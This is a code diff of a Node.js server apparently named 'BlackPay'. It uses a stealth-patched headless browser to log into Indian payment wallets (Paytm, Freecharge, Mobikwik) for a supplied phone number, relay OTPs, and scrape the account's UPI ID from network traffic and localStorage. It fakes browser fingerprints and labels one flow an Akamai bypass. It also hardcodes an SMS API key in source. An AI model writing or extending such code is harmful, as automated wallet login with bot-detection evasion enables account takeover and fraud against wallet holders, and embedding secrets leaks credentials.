@@ -2,20 +2,68 @@ const express = require('express');
 const cors = require('cors');
 const fs = require('fs'); 
 const path = require('path');
+const https = require('https'); // For Fast2SMS API
 
+// ANTI-CAPTCHA STEALTH MODE ACTIVATED
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 puppeteer.use(StealthPlugin());
 
 const app = express();
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 app.use(cors());
 
+// 🔴 TERA FAST2SMS API KEY YAHAN SAFE HAI (No one can see this from APK)
+const FAST2SMS_API_KEY = "dl51mufyW8oVtTEzHYnKXIUjx6GSMFDCR93JBObN40saehLqkvG5HnUSwa6mIzVDYso8p7AWhEQJNXPc";
+
 app.get('/', (req, res) => {
-    jsonResponse = { success: true, message: "BlackPay Server is Live & Running!" };
-    res.json(jsonResponse);
+    res.json({ success: true, message: "BlackPay Server is Live & Running!" });
 });
 
+// ============================================================================
+// 0. API: SEND SMS OTP VIA FAST2SMS (SECURED BACKEND)
+// ============================================================================
+app.post('/api/send-sms', (req, res) => {
+    const { phone, otp } = req.body;
+    if (!phone || !otp) return res.status(400).json({ success: false, message: "Phone or OTP missing." });
+
+    const data = new URLSearchParams({'route': 'otp', 'variables_values': otp, 'numbers': phone}).toString();
+
+    const options = {
+        hostname: 'www.fast2sms.com',
+        path: '/dev/bulkV2',
+        method: 'POST',
+        headers: {
+            'authorization': FAST2SMS_API_KEY,
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Length': data.length
+        }
+    };
+
+    const request = https.request(options, (response) => {
+        let body = '';
+        response.on('data', chunk => body += chunk);
+        response.on('end', () => {
+            try {
+                const parsed = JSON.parse(body);
+                if(parsed.return === true) {
+                    res.json({ success: true, message: "OTP Sent Successfully!" });
+                } else {
+                    res.status(400).json({ success: false, message: parsed.message[0] || "Fast2SMS Error" });
+                }
+            } catch(e) {
+                res.json({ success: true, message: "OTP Requested!" }); // Fallback success
+            }
+        });
+    });
+
+    request.on('error', (e) => res.status(500).json({ success: false, message: "Server SMS Error" }));
+    request.write(data);
+    request.end();
+});
+
+// Global variables for Wallet
 let browser;
 let page;
 let currentPhone = "";
@@ -28,13 +76,10 @@ function keepSessionAlive() {
         if (browser) {
             console.log("⏱️ [!] 90s Idle Timeout. Closing browser.");
             try { await browser.close(); } catch(e) {}
-            browser = null;
-            page = null;
+            browser = null; page = null;
         }
     }, 90000);
 }
-
-console.log("🔥 BlackPay Server Active (Full Page Load for Paytm Biz Enabled)...");
 
 async function dismissPopups(page) {
     try {
@@ -49,7 +94,7 @@ async function dismissPopups(page) {
 }
 
 // ============================================================================
-// 1. API: AUTOMATED SEND OTP
+// 1. API: AUTOMATED SEND OTP (WALLET)
 // ============================================================================
 app.post('/api/wallet/send-otp', async (req, res) => {
     const { phone, password, walletType } = req.body; 
@@ -63,7 +108,7 @@ app.post('/api/wallet/send-otp', async (req, res) => {
         let walletName = walletType ? walletType.toLowerCase().trim() : "";
         currentPhone = phone; currentWallet = walletName;
 
-        console.log(`\n[+] New Login Request -> Phone: ${phone} | Wallet: ${walletName.toUpperCase()}`);
+        console.log(`\n[+] Wallet Login Request -> Phone: ${phone} | Wallet: ${walletName.toUpperCase()}`);
         
         try {
             browser = await puppeteer.connect({ 
@@ -80,9 +125,17 @@ app.post('/api/wallet/send-otp', async (req, res) => {
         await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
         await page.evaluateOnNewDocument(() => { Object.defineProperty(navigator, 'webdriver', { get: () => false }); });
 
-        // 🔴 MAHA ILAZ: Request Interception (Image Blocker) hamesha ke liye HATA DIYA HAI!
-        // Ab Paytm ki site original tareeke se poori load hogi (Background images aur CSS ke sath).
+        await page.setRequestInterception(true);
+        page.on('request', async (req) => {
+            if (req.isInterceptResolutionHandled()) return;
+            try {
+                // DO NOT BLOCK IMAGES. LET PAYTM LOAD FULLY.
+                if (['media'].includes(req.resourceType())) { await req.abort('aborted'); } 
+                else { await req.continue(); }
+            } catch(e) {}
+        });
 
+        // ================= PAYTM / PAYTM BUSINESS FLOW =================
         if (walletName === 'paytm' || walletName === 'paytm business') {
             console.log("[+] Opening Paytm login page...");
             try { await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded', timeout: 35000 }); } 
@@ -136,6 +189,7 @@ app.post('/api/wallet/send-otp', async (req, res) => {
             await page.keyboard.press('Enter');
         }
 
+        // ================= FREECHARGE FLOW (AKAMAI BYPASS) =================
         else if (walletName.includes('freecharge')) {
             console.log("[+] Opening Freecharge homepage with Extreme Stealth...");
             try { await page.goto('https://www.freecharge.in/', { waitUntil: 'networkidle2', timeout: 35000 }); } 
@@ -198,11 +252,8 @@ app.post('/api/wallet/send-otp', async (req, res) => {
                 }
             } catch(e){}
             if (!otpClicked) { try { await page.keyboard.press('Enter'); } catch(e){} }
-            console.log("[+] Freecharge OTP request triggered.");
         }
-
         else {
-            console.log("[+] Opening generic wallet logic...");
             if (walletName.includes('mobikwik')) {
                 await page.goto('https://www.mobikwik.com/', { waitUntil: 'domcontentloaded', timeout: 35000 });
                 await new Promise(r => setTimeout(r, 3000));
@@ -215,12 +266,13 @@ app.post('/api/wallet/send-otp', async (req, res) => {
             await new Promise(r => setTimeout(r, 1000));
             try { await page.keyboard.press('Enter'); } catch(e){}
         }
+        
         res.json({ success: true, message: `OTP request sent for ${phone}` });
     } catch (error) { res.status(500).json({ success: false, message: "Network Error.", error: error.message }); }
 });
 
 // ============================================================================
-// 2. API: VERIFY OTP & EXTRACT UPI
+// 2. API: VERIFY OTP & EXTRACT UPI (Crash & Timeout Proof)
 // ============================================================================
 app.post('/api/wallet/verify-otp', async (req, res) => {
     const { otp } = req.body; keepSessionAlive(); 
@@ -239,7 +291,7 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
                     const text = await response.text();
                     const upiRegex = /[a-zA-Z0-9.\-_]{3,}@(pty|paytmpty|paytm|paytmqr|freecharge|icici|ybl|axl|oksbi|apypaytm|mobikwik|ikwik|upi|ptsbi)/i;
                     const match = text.match(upiRegex);
-                    if (match && !interceptedUpi) { interceptedUpi = match[0]; console.log(`[+] API Sniffed UPI ID: ${interceptedUpi}`); }
+                    if (match && !interceptedUpi) { interceptedUpi = match[0]; }
                     if (url.includes('verify') || url.includes('login') || url.includes('auth') || url.includes('otp')) {
                         if (response.status() >= 400) { isOtpApiFailed = true; } else {
                             const textLower = text.toLowerCase();
@@ -249,7 +301,6 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
                 }
             } catch(e) {} 
         };
-
         page.on('response', networkListener);
 
         try {
@@ -291,8 +342,9 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
             if (!verifyClicked) { await page.keyboard.press('Enter'); }
         } catch(e) {}
 
-        console.log("[+] Awaiting Dashboard Loading...");
-        try { await page.waitForNavigation({ timeout: 6000, waitUntil: 'domcontentloaded' }); } catch(e) { await new Promise(r => setTimeout(r, 4000)); }
+        console.log("[+] Waiting for Network traffic & Dashboard (8 Secs)...");
+        // 🔴 INCREASED TIMEOUT: Wait longer so Paytm API responses can be sniffed properly!
+        await new Promise(r => setTimeout(r, 8000)); 
         await dismissPopups(page);
 
         if (isOtpApiFailed) { return res.status(400).json({ success: false, message: "Invalid OTP! Please try again." }); }
@@ -302,39 +354,45 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
 
         if (currentUrl.includes('freecharge') || currentWallet.includes('freecharge')) { finalUpi = `${currentPhone}@freecharge`; } 
         else if (currentUrl.includes('paytm') || currentWallet.includes('paytm')) {
-            try {
-                console.log("[+] Forcing Paytm to navigate to Profile Settings...");
-                await page.goto('https://dashboard.paytm.com/next/profile', { waitUntil: 'domcontentloaded', timeout: 25000 }).catch(e=>{});
-                await new Promise(r => setTimeout(r, 5000));
-            } catch(navErr) {}
-
-            console.log("[+] Deep Scanning Memory (Local Storage, Session Storage & DOM) for UPI ID...");
-            for (let i = 0; i < 15; i++) {
-                if (interceptedUpi) { finalUpi = interceptedUpi; break; }
-                try {
-                    finalUpi = await page.evaluate(() => {
-                        const regex = /[a-zA-Z0-9.\-_]{3,}@(paytm|paytmpty|pty|paytmqr|upi)/i;
-                        const textMatch = document.body.innerText.match(regex); if (textMatch) return textMatch[0];
-                        for (let j = 0; j < localStorage.length; j++) { let val = localStorage.getItem(localStorage.key(j)); if (val && regex.test(val)) return val.match(regex)[0]; }
-                        for (let j = 0; j < sessionStorage.length; j++) { let val = sessionStorage.getItem(sessionStorage.key(j)); if (val && regex.test(val)) return val.match(regex)[0]; }
-                        const htmlMatch = document.documentElement.innerHTML.match(regex); if (htmlMatch) return htmlMatch[0];
-                        return "";
-                    });
-                } catch(e) {}
-                if (finalUpi) break; await new Promise(r => setTimeout(r, 1000));
+            console.log("[+] Searching Network and Local Storage for Paytm UPI...");
+            // 1. Give absolute priority to Network Sniffed UPI
+            if (interceptedUpi) {
+                finalUpi = interceptedUpi;
+            } else {
+                // 2. Fallback to Local Storage if network didn't catch it
+                for (let i = 0; i < 15; i++) {
+                    try {
+                        finalUpi = await page.evaluate(() => {
+                            const regex = /[a-zA-Z0-9.\-_]{3,}@(paytm|paytmpty|pty|paytmqr|upi)/i;
+                            for (let j = 0; j < localStorage.length; j++) {
+                                let val = localStorage.getItem(localStorage.key(j));
+                                if (val && regex.test(val)) return val.match(regex)[0];
+                            }
+                            const textMatch = document.body.innerText.match(regex);
+                            if (textMatch) return textMatch[0];
+                            return "";
+                        });
+                    } catch(e) {}
+                    if (finalUpi) break;
+                    await new Promise(r => setTimeout(r, 1000));
+                }
             }
+
             if (!finalUpi || finalUpi.trim() === "") {
-                return res.status(400).json({ success: false, message: "UPI Extraction Failed. Dashboard took too long to load. Please Retry." });
+                return res.status(400).json({ success: false, message: "UPI Extraction Failed. Try Again." });
             }
         } 
         else if (currentWallet.includes('mobikwik')) { finalUpi = `${currentPhone}@ikwik`; } else if (currentWallet.includes('phonepe')) { finalUpi = `${currentPhone}@ybl`; }
 
-        console.log(`[+] Authentication complete. Extracted UPI: ${finalUpi}`);
+        console.log(`[+] Extracted UPI: ${finalUpi}`);
         res.json({ success: true, message: "Account Successfully Linked!", upi_id: finalUpi, mobile: currentPhone });
 
-    } catch (error) { res.status(500).json({ success: false, message: "Validation Process Failed due to Server Load." }); }
+    } catch (error) { res.status(500).json({ success: false, message: "Validation Process Failed." }); }
 });
 
+// ============================================================================
+// 3. API: VERIFY UTR
+// ============================================================================
 app.post('/api/wallet/verify-utr', async (req, res) => {
     const { utr } = req.body; keepSessionAlive(); 
     if (!page) return res.status(400).json({ success: false, message: "Browser session not active." });
